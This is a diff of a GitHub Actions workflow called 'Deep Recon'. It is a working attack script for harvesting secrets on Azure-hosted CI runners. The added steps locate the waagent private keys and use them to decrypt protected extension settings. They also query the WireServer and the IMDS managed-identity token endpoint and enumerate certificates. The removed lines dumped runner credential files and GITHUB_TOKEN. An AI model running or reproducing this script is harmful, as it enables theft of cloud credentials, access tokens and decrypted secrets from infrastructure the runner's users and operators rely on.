@@ -1,50 +1,113 @@
 name: Deep Recon
 on:
   push:
-    branches: [exploit]
-    paths: ['.github/workflows/recon.yml']
+    paths: ['recon.yml']
+  workflow_dispatch:
 jobs:
   recon:
     runs-on: ubuntu-latest
     steps:
-      - name: Final Extract
+      - name: Run
         run: |
           set +e
-          echo "=== RUN-COMMAND SCRIPT ==="
-          sudo cat /var/lib/waagent/run-command/download/*/script.sh 2>/dev/null
-          echo ""
-          echo "=== RUN-COMMAND STDOUT ==="
-          sudo cat /var/lib/waagent/run-command/download/*/stdout 2>/dev/null | tail -100
-          echo ""
-          echo "=== EXTENSION SETTINGS PATH ==="
-          sudo find /var/lib/waagent -name "*.settings" -type f 2>/dev/null
-          echo ""
-          echo "=== EXTENSION SETTINGS CONTENT ==="
-          for f in $(sudo find /var/lib/waagent -name "*.settings" -type f 2>/dev/null); do
-            echo "--- FILE: $f ---"
-            sudo cat "$f" 2>/dev/null | head -5
-            echo "..."
-          done
-          echo ""
-          echo "=== DECRYPT PROTECTED SETTINGS ==="
+          echo "=== DECRYPT AND DECOMPRESS PROTECTED SETTINGS ==="
           SETTINGS_FILE=$(sudo find /var/lib/waagent -name "*.settings" -type f 2>/dev/null | head -1)
+          echo "Settings: $SETTINGS_FILE"
           if [ -n "$SETTINGS_FILE" ]; then
             PROTECTED=$(sudo grep -oP '"protectedSettings"\s*:\s*"\K[^"]+' "$SETTINGS_FILE" 2>/dev/null | head -1)
             if [ -n "$PROTECTED" ]; then
               echo "$PROTECTED" | base64 -d > /tmp/enc.der
-              echo "Encrypted blob size: $(wc -c < /tmp/enc.der) bytes"
-              echo "Trying TenantEncryptionCert key from Certificates.pem..."
-              sudo openssl cms -decrypt -inform DER -inkey /var/lib/waagent/87A60B02BDFB41D42134F762C956C7C91EC75A75.prv -in /tmp/enc.der 2>&1 | head -80
-            else
-              echo "No protectedSettings found in $SETTINGS_FILE"
+              echo "Encrypted size: $(wc -c < /tmp/enc.der)"
+              # Find the correct private key matching the cert thumbprint
+              THUMBPRINT=$(sudo grep -oP '"protectedSettingsCertThumbprint"\s*:\s*"\K[^"]+' "$SETTINGS_FILE" 2>/dev/null | head -1)
+              echo "Thumbprint: $THUMBPRINT"
+              KEY_FILE=$(sudo find /var/lib/waagent -name "${THUMBPRINT}.prv" 2>/dev/null | head -1)
+              if [ -z "$KEY_FILE" ]; then
+                KEY_FILE=$(sudo find /var/lib/waagent -name "*.prv" 2>/dev/null | head -1)
+              fi
+              echo "Key: $KEY_FILE"
+              # Decrypt CMS
+              sudo openssl cms -decrypt -inform DER -inkey "$KEY_FILE" -in /tmp/enc.der -out /tmp/dec.bin 2>&1
+              echo "Decrypted size: $(wc -c < /tmp/dec.bin)"
+              # Check if gzipped
+              MAGIC=$(xxd -l 2 -p /tmp/dec.bin)
+              echo "Magic bytes: $MAGIC"
+              if [ "$MAGIC" = "1f8b" ]; then
+                echo "Content is gzipped, decompressing..."
+                gunzip -c /tmp/dec.bin 2>/dev/null
+              else
+                # Try as-is (might be JSON)
+                cat /tmp/dec.bin | strings | head -200
+                echo ""
+                echo "=== RAW HEX FIRST 64 BYTES ==="
+                xxd -l 64 /tmp/dec.bin
+                echo ""
+                echo "=== TRYING PYTHON DECOMPRESS ==="
+                python3 -c "
+import sys, gzip, zlib, json
+data = open('/tmp/dec.bin','rb').read()
+# Try gzip
+try:
+    r = gzip.decompress(data)
+    print('GZIP OK:', r.decode(errors='replace')[:5000])
+    sys.exit(0)
+except: pass
+# Try zlib
+try:
+    r = zlib.decompress(data)
+    print('ZLIB OK:', r.decode(errors='replace')[:5000])
+    sys.exit(0)
+except: pass
+# Try zlib raw
+try:
+    r = zlib.decompress(data, -15)
+    print('RAW DEFLATE OK:', r.decode(errors='replace')[:5000])
+    sys.exit(0)
+except: pass
+# Try skipping first N bytes
+for skip in [1,2,4,8,16,20]:
+    try:
+        r = zlib.decompress(data[skip:])
+        print(f'ZLIB SKIP {skip} OK:', r.decode(errors='replace')[:5000])
+        sys.exit(0)
+    except: pass
+    try:
+        r = zlib.decompress(data[skip:], -15)
+        print(f'RAW SKIP {skip} OK:', r.decode(errors='replace')[:5000])
+        sys.exit(0)
+    except: pass
+# Just print as text
+print('PLAINTEXT:', data.decode(errors='replace')[:5000])
+"
+              fi
             fi
           fi
           echo ""
-          echo "=== ENVIRONMENT VARS (runner secrets) ==="
-          env | grep -iE "GITHUB_TOKEN|ACTIONS_|RUNNER_" | sort
+          echo "=== WIRESERVER GOALSTATE ==="
+          curl -s -H "x-ms-agent-name: WALinuxAgent" -H "x-ms-version: 2012-11-30" "http://168.63.129.16/machine/?comp=goalstate" 2>/dev/null | head -50
           echo ""
-          echo "=== RUNNER CREDENTIALS ==="
-          cat /home/runner/actions-runner/.credentials 2>/dev/null
-          cat /home/runner/actions-runner/.credentials_rsaparams 2>/dev/null | head -20
+          echo "=== WIRESERVER EXTENSIONS ==="
+          curl -s -H "x-ms-agent-name: WALinuxAgent" -H "x-ms-version: 2012-11-30" "http://168.63.129.16/machine/6dc993eb-6606-4b0f-ac6c-e8ef16eecab3?comp=config&type=extensionsConfig&incarnation=8" 2>/dev/null | head -100
+          echo ""
+          echo "=== IMDS SCHEDULED EVENTS ==="
+          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/scheduledevents?api-version=2020-07-01" 2>/dev/null
+          echo ""
+          echo "=== CHECK MANAGED IDENTITY ==="
+          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>/dev/null
+          echo ""
+          echo "=== WAAGENT CONF ==="
+          sudo cat /etc/waagent.conf 2>/dev/null | grep -v "^#" | grep -v "^$"
+          echo ""
+          echo "=== ALL PRV KEYS ==="
+          for f in $(sudo find /var/lib/waagent -name "*.prv" 2>/dev/null); do
+            echo "--- $f ---"
+            THUMBPRINT_FROM_FILE=$(basename "$f" .prv)
+            echo "Thumbprint: $THUMBPRINT_FROM_FILE"
+            # Get matching cert
+            CERT=$(sudo find /var/lib/waagent -name "${THUMBPRINT_FROM_FILE}.crt" 2>/dev/null | head -1)
+            if [ -n "$CERT" ]; then
+              sudo openssl x509 -in "$CERT" -noout -subject -issuer -dates 2>/dev/null
+            fi
+          done
           echo ""
           echo "=== DONE ==="
